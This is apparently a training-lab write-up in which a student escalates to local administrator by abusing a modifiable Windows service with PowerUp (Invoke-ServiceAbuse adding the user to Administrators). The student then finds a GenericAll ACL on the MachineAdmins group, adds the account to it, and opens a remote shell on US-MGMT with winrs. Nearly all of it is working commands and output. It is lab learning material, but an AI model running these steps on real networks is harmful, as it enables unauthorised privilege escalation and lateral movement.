# HANDS-ON 5:

```
  - Exploit a service on studentx and elevate privileges to local administrator.
  - Identify a machine in the domain where studentuserx has local administrative access due to
    group membership.
```
## Index Of Content

  1. [Exploit Service](#exploit-service)
  2. [Identify machine admin access](#identify-machoneadmin-access)

## Exploit service

Import Module PowerUp:
```
PS C:\AD\Tools\InviShell> Import-Module C:\AD\Tools\PowerUp.ps1
```
Invoke all checks for privilege escalation:
```
PS C:\AD\Tools\InviShell> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


[*] Checking service executable and argument permissions...


ServiceName                     : ALG
Path                            : C:\AD\Tools\payloads\adduser.exe
ModifiableFile                  : C:\AD\Tools\payloads\adduser.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'ALG'
CanRestart                      : True

ServiceName                     : ALG
Path                            : C:\AD\Tools\payloads\adduser.exe
ModifiableFile                  : C:\AD\Tools\payloads\adduser.exe
ModifiableFilePermissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
ModifiableFileIdentityReference : US\studentuser34
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'ALG'
CanRestart                      : True

ServiceName                     : gupdate
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /svc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'gupdate'
CanRestart                      : False

ServiceName                     : gupdatem
Path                            : "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" /medsvc
ModifiableFile                  : C:\
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'gupdatem'
CanRestart                      : False

ServiceName                     : neo4j
Path                            : C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin\tools\prunsrv-amd
                                  64.exe //RS//neo4j
ModifiableFile                  : C:\AD\Tools\neo4j-community-4.4.5-windows\neo4j-community-4.4.5\bin\tools\prunsrv-amd
                                  64.exe
ModifiableFilePermissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'neo4j'
CanRestart                      : False

ServiceName                     : winlogbeat
Path                            : "C:\Program Files\winlogbeat\winlogbeat.exe" --environment=windows_service -c
                                  "C:\Program Files\winlogbeat\winlogbeat.yml" --path.home "C:\Program
                                  Files\winlogbeat" --path.data "C:\ProgramData\winlogbeat" --path.logs
                                  "C:\ProgramData\winlogbeat\logs" -E logging.files.redirect_stderr=true
ModifiableFile                  : C:\ProgramData\winlogbeat
ModifiableFilePermissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes,
                                  WriteData/AddFile}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'winlogbeat'
CanRestart                      : False

ServiceName                     : winlogbeat
Path                            : "C:\Program Files\winlogbeat\winlogbeat.exe" --environment=windows_service -c
                                  "C:\Program Files\winlogbeat\winlogbeat.yml" --path.home "C:\Program
                                  Files\winlogbeat" --path.data "C:\ProgramData\winlogbeat" --path.logs
                                  "C:\ProgramData\winlogbeat\logs" -E logging.files.redirect_stderr=true
ModifiableFile                  : C:\ProgramData\winlogbeat\logs
ModifiableFilePermissions       : {WriteAttributes, AppendData/AddSubdirectory, WriteExtendedAttributes,
                                  WriteData/AddFile}
ModifiableFileIdentityReference : BUILTIN\Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'winlogbeat'
CanRestart                      : False





[*] Checking service permissions...


ServiceName   : ALG
Path          : C:\AD\Tools\payloads\adduser.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'ALG'
CanRestart    : True





[*] Checking %PATH% for potentially hijackable DLL locations...

ModifiablePath    : C:\Python27\
IdentityReference : BUILTIN\Users
Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
%PATH%            : C:\Python27\
AbuseFunction     : Write-HijackDll -DllPath 'C:\Python27\\wlbsctrl.dll'

ModifiablePath    : C:\Python27\Scripts
IdentityReference : BUILTIN\Users
Permissions       : {Delete, WriteAttributes, Synchronize, ReadControl...}
%PATH%            : C:\Python27\Scripts
AbuseFunction     : Write-HijackDll -DllPath 'C:\Python27\Scripts\wlbsctrl.dll'

ModifiablePath    : C:\Users\studentuser34\AppData\Local\Microsoft\WindowsApps
IdentityReference : US\studentuser34
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\studentuser34\AppData\Local\Microsoft\WindowsApps
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\studentuser34\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'





[*] Checking for AlwaysInstallElevated registry key...


[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....




[*] Checking for cached Group Policy Preferences .xml files....

```

Abuse service:
```
PS C:\AD\Tools\InviShell> Invoke-ServiceAbuse -Name ALG -UserName us\studentuser34

ServiceAbused Command
------------- -------
ALG           net localgroup Administrators us\studentuser34 /add
```
## Identify machine admin access

```
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\Windows\system32> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\Windows\system32> function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName)
>> {
>> $groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName |
>> select -ExpandProperty distinguishedname)
>> $groups
>> if ($groups.count -gt 0)
>> {
>> foreach ($group in $groups)
>> {
>> Get-ADPrincipalGroupMembershipRecursive $group
>> }
>> }
>> }
PS C:\Windows\system32> Get-ADPrincipalGroupMembershipRecursive 'studentuser17'
CN=Domain Users,CN=Users,DC=us,DC=techcorp,DC=local
CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
CN=Users,CN=Builtin,DC=us,DC=techcorp,DC=local
CN=MaintenanceUsers,CN=Users,DC=us,DC=techcorp,DC=local
CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local

```
Finding ACLs and maching with previous groups:

```
PS C:\Windows\system32> Find-InterestingDomainAcl | ?{$_.IdentityReferenceName -match 'Managers'}
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a distinguishedname with Convert-ADName


ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty
ObjectAceType           : bf9679c0-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, InheritOnly
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild
ObjectAceType           : bf967a9c-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : 00000000-0000-0000-0000-000000000000
AceFlags                : ContainerInherit, InheritOnly
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty
ObjectAceType           : bf9679c0-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, InheritOnly, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild
ObjectAceType           : bf967a9c-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : 00000000-0000-0000-0000-000000000000
AceFlags                : ContainerInherit, InheritOnly, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Windows Virtual Machine,CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty
ObjectAceType           : bf9679c0-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, InheritOnly, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Windows Virtual Machine,CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild
ObjectAceType           : bf967a9c-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Windows Virtual Machine,CN=US-MGMT,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : 00000000-0000-0000-0000-000000000000
AceFlags                : ContainerInherit, InheritOnly, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ReadProperty, WriteProperty
ObjectAceType           : bf9679c0-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild
ObjectAceType           : bf967a9c-0de6-11d0-a285-00aa003049e2
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : 00000000-0000-0000-0000-000000000000
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group

```

Set permissions:

```
PS C:\AD\Tools\ADModule-master> Get-ADGroup -Identity machineadmins -Properties Description


Description       : Group to manage machines of the Mgmt OU
DistinguishedName : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
GroupCategory     : Security
GroupScope        : Global
Name              : MachineAdmins
ObjectClass       : group
ObjectGUID        : a02c806e-f233-4c39-a0cc-adf37628365a
SamAccountName    : machineadmins
SID               : S-1-5-21-210670787-2521448726-163245708-1118
```
```
Add-ADGroupMember -Identity MachineAdmins -Members studentuser17 -Verbose
VERBOSE: Performing the operation "Set" on target "CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local".
```

Access to US-MGMT:
```
C:\Users\studentuser17>winrs -r:us-mgmt cmd
Microsoft Windows [Version 10.0.17763.3650]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\studentuser17>whoami
whoami
us\studentuser17

C:\Users\studentuser17>hostname
hostname
US-Mgmt

```
